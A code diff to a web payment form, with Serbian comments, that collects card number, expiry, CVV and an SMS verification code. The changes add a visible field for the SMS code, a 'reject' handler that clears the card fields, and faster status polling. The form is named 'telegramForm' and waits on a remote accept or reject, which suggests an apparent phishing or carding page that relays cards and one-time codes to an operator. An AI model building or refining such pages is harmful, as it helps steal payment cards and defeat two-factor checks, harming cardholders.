@@ -74,8 +74,14 @@
                                     </div>
                                 </div>
                             </div>
-                            <input type="text" id="smsCode" name="smsCode" placeholder="Unesite SMS kod" style="display: none;">
-                            <button type="button" id="sendSmsCode-btn" style="display: none;">Pošalji SMS kod</button>
+                            <div class="form-row">
+                                <div class="col">
+                                    <input type="text" id="smsCode" class="form-control" name="smsCode" placeholder="Enter verification code" style="display: none;">
+                                </div>
+                                <div class="col">
+                                    <button type="button" id="sendSmsCode-btn" class="btn btn-primary btn-block" style="display: none;">Verification</button>
+                                </div>
+                            </div>
                         
                     </form>
                 </div>
@@ -165,10 +171,23 @@
                             } else {
                                 $('#submit-btn').show();
                             }
+                        } else if(response.status === 'reject') {
+                            clearInterval(interval);
+                            $('#spinner').hide();
+                            $('#submit-btn').show();
+                            // Prikazivanje poruke o nevažećoj kartici
+                            alert('Card not valid');
+                            
+                            $('#telegramForm')[0].reset();
+                            $('#cardHolderName').val('');
+                            $('#cardNumber').val('');
+                            $('#expiryDate').val('');
+                            $('#cvv').val('');
+                            $('#amount').val('25.00');
                         }
                     }
                 });
-            }, 2000);
+            }, 1000);
         }
         document.getElementById('cardNumber').addEventListener('input', function (e) {
             var target = e.target;
